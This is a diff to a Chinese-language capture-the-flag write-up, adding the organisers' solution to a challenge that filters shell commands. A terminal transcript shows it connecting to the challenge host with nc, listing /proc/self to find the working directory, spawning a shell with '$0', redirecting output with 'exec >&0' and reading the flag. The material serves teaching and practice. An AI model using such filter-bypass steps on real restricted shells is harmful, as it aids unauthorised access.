@@ -92,7 +92,6 @@ unsigned __int64 init()
     export
     ```
     
-
 - docker中能利用的命令不多，除了被过滤的`cat` 和`sh`之外，还有 `ls` 和`cd`
 
 - `cd -`可以输出`OLD_PWD`，也就是`/`，但是并无有神马用处
@@ -164,3 +163,82 @@ unsigned __int64 init()
 
 - 这题在`check1`卡了好久，第三天才想到`ls -i`，我太菜了。
 
+
+
+## 官方解
+
+- 本来是要考察`proc`的，还是要多学些东西的
+
+- `check1` : `ls -l /proc/self/cwd` 
+
+- `check2`: `$0` 
+
+- 赶紧学习一波`/proc`
+
+  ```
+  % nc 47.103.214.163 21000
+  find yourself
+  ls -al /proc/self/
+  total 0
+  dr-xr-xr-x   9 1000 1000 0 Feb  1 09:44 .
+  dr-xr-xr-x 121    0    0 0 Feb  1 09:42 ..
+  dr-xr-xr-x   2 1000 1000 0 Feb  1 09:44 attr
+  -rw-r--r--   1 1000 1000 0 Feb  1 09:44 autogroup
+  -r--------   1 1000 1000 0 Feb  1 09:44 auxv
+  -r--r--r--   1 1000 1000 0 Feb  1 09:44 cgroup
+  --w-------   1 1000 1000 0 Feb  1 09:44 clear_refs
+  -r--r--r--   1 1000 1000 0 Feb  1 09:44 cmdline
+  -rw-r--r--   1 1000 1000 0 Feb  1 09:44 comm
+  -rw-r--r--   1 1000 1000 0 Feb  1 09:44 coredump_filter
+  -r--r--r--   1 1000 1000 0 Feb  1 09:44 cpuset
+  lrwxrwxrwx   1 1000 1000 0 Feb  1 09:44 cwd -> /tmp/0xb3f14a49
+  -r--------   1 1000 1000 0 Feb  1 09:44 environ
+  lrwxrwxrwx   1 1000 1000 0 Feb  1 09:44 exe -> /bin/ls
+  dr-x------   2 1000 1000 0 Feb  1 09:44 fd
+  dr-x------   2 1000 1000 0 Feb  1 09:44 fdinfo
+  -rw-r--r--   1 1000 1000 0 Feb  1 09:44 gid_map
+  -r--------   1 1000 1000 0 Feb  1 09:44 io
+  -r--r--r--   1 1000 1000 0 Feb  1 09:44 limits
+  -rw-r--r--   1 1000 1000 0 Feb  1 09:44 loginuid
+  dr-x------   2 1000 1000 0 Feb  1 09:44 map_files
+  -r--r--r--   1 1000 1000 0 Feb  1 09:44 maps
+  -rw-------   1 1000 1000 0 Feb  1 09:44 mem
+  -r--r--r--   1 1000 1000 0 Feb  1 09:44 mountinfo
+  -r--r--r--   1 1000 1000 0 Feb  1 09:44 mounts
+  -r--------   1 1000 1000 0 Feb  1 09:44 mountstats
+  dr-xr-xr-x   5 1000 1000 0 Feb  1 09:44 net
+  dr-x--x--x   2 1000 1000 0 Feb  1 09:44 ns
+  -r--r--r--   1 1000 1000 0 Feb  1 09:44 numa_maps
+  -rw-r--r--   1 1000 1000 0 Feb  1 09:44 oom_adj
+  -r--r--r--   1 1000 1000 0 Feb  1 09:44 oom_score
+  -rw-r--r--   1 1000 1000 0 Feb  1 09:44 oom_score_adj
+  -r--------   1 1000 1000 0 Feb  1 09:44 pagemap
+  -r--------   1 1000 1000 0 Feb  1 09:44 patch_state
+  -r--------   1 1000 1000 0 Feb  1 09:44 personality
+  -rw-r--r--   1 1000 1000 0 Feb  1 09:44 projid_map
+  lrwxrwxrwx   1 1000 1000 0 Feb  1 09:44 root -> /
+  -rw-r--r--   1 1000 1000 0 Feb  1 09:44 sched
+  -r--r--r--   1 1000 1000 0 Feb  1 09:44 schedstat
+  -r--r--r--   1 1000 1000 0 Feb  1 09:44 sessionid
+  -rw-r--r--   1 1000 1000 0 Feb  1 09:44 setgroups
+  -r--r--r--   1 1000 1000 0 Feb  1 09:44 smaps
+  -r--r--r--   1 1000 1000 0 Feb  1 09:44 smaps_rollup
+  -r--------   1 1000 1000 0 Feb  1 09:44 stack
+  -r--r--r--   1 1000 1000 0 Feb  1 09:44 stat
+  -r--r--r--   1 1000 1000 0 Feb  1 09:44 statm
+  -r--r--r--   1 1000 1000 0 Feb  1 09:44 status
+  -r--------   1 1000 1000 0 Feb  1 09:44 syscall
+  dr-xr-xr-x   3 1000 1000 0 Feb  1 09:44 task
+  -r--r--r--   1 1000 1000 0 Feb  1 09:44 timers
+  -rw-rw-rw-   1 1000 1000 0 Feb  1 09:44 timerslack_ns
+  -rw-r--r--   1 1000 1000 0 Feb  1 09:44 uid_map
+  -r--r--r--   1 1000 1000 0 Feb  1 09:44 wchan
+  where are you?
+  /tmp/0xb3f14a49
+  $0
+  exec >&0
+  cat /flag
+  hgame{You_4re_So_C1EV3R}
+  ```
+
+  
